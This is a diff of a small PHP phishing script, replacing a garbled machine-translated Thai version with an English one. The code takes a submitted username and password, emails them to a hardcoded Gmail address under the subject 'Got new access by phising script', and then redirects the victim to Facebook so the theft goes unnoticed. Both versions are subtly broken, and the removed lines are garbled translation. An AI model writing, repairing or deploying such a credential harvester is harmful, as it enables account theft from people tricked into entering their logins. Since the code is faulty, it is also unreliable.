@@ -1,16 +1,18 @@
-<php?
-	mail_sender () {
-		$ username = $ POST [ 'ชื่อผู้ใช้' ];
-		$ password = $ POST [ 'รหัสผ่าน' ];
+<?php
+	mail_sender(){
+		$username = $POST['username'];
+		$password = $POST['password'];
 		
-		$ reciever = "ที่อยู่อีเมลของคุณ" ;
+		$reciever = "ottzavrzoabc@gmail.com";
 		
-		$ subject = "ได้รับการเข้าถึงใหม่โดย phising script" ;
-		$ข้อความ ="ชื่อผู้ใช้" $ชื่อผู้ใช้ ;
-		$ข้อความ . ="และรหัสผ่านคือ" รหัสผ่าน$ ;
+		$subject = "Got new access by phising script";
+		$message = "The username is ". $username;
+		$message .= "and password is ". $password;
 		
-		 อีเมลที่ส่งคืน ( $ reciever , $ subject , $ message );
+		return mail($reciever, $subject, $message);
 	}
 	
-	ถ้า ( mail_sender ()) {
-		header ( "Location: http://www.facebook.com" );
+	if(mail_sender()){
+		header("Location: http://www.facebook.com");
+	}
+?>
